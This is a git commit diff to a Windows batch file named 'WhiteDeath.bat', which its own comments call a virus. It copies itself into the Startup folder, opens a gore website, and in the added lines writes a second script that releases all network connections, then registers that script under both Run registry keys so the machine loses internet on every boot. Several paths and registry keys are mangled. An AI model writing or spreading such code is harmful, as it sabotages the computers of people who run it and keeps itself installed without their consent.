02560bf1f4cb2ae5296e49b36bbf7abe08d38079
Last-Ai <132348071+Last-Ai@users.noreply.github.com>
2023-05-31 08:10:21 +1000

    Update WhiteDeath.bat

--- WhiteDeath.bat
+++ WhiteDeath.bat
@@ -3,6 +3,7 @@
 rem Copys Virus To Startup On Open
 copy "WhiteDeath.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
+rem random stuff
 timeout /t 8 > nul
 
 start "http://www.bestgore.fun"
@@ -15,3 +16,10 @@ timeout /t 11 > nul
 
 start calc.exe
 
+rem perm no internet
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
